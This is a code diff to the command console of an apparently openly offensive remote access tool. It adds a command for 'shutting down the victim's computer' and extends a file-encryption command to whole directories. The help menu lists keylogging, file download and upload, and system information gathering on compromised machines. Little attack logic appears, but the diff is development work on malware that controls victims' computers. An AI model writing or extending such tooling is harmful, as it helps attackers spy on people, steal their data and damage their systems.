@@ -245,6 +245,13 @@ func main() {
 			fmt.Println(string(buffer))
 		}
 
+		if message == "shutdown" {
+			buffer = make([]byte, 1024)
+			conn.Write([]byte("shutdown"))
+			conn.Read(buffer)
+			fmt.Println(string(buffer))
+		}
+
 		if strings.HasPrefix(message, "close") {
 			Red.Println("close connection")
 			conn.Write([]byte(message))
@@ -307,9 +314,10 @@ func helpmenu() {
 	CommPrint("file", "download file")
 	CommPrint("ifconfig", "network information")
 	CommPrint("upfile", "upload file")
-	CommPrint("crypt", "crypt file")
+	CommPrint("crypt", "crypt file or directory")
 	CommPrint("sysinfo", "all system information")
 	CommPrint("keylogger", "keylogger")
+	CommPrint("shutdown", "shutting down the victim's computer")
 }
 
 func logo() {
@@ -324,7 +332,7 @@ func logo() {
 	Blue.Print("\\____/  \\____/")
 	Magenta.Println("	\\_/\\_\\\\_/ \\|  \\_/")
 	Green.Print("\t\t\t   v ")
-	Red.Println("1.2.2")
+	Red.Println("1.3.0")
 	fmt.Print("coded by")
 	Green.Print(" >> ")
 	Magenta.Println("nikait")
